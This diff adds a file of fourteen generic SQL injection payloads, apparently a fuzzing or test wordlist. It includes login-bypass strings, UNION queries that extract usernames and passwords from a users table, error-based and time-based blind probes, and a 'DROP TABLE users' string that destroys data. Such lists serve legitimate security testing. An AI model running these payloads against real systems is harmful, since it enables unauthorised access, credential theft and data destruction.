@@ -1,0 +1,14 @@
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+'; DROP TABLE users;--
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+1 OR 1=1
+admin'--
+' OR '' = '
+' OR 1=1#
+') OR ('1'='1
+' AND SUBSTRING(username,1,1)='a'--
+' UNION SELECT username,password,NULL,NULL,NULL,NULL,NULL,NULL FROM users--
+1; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
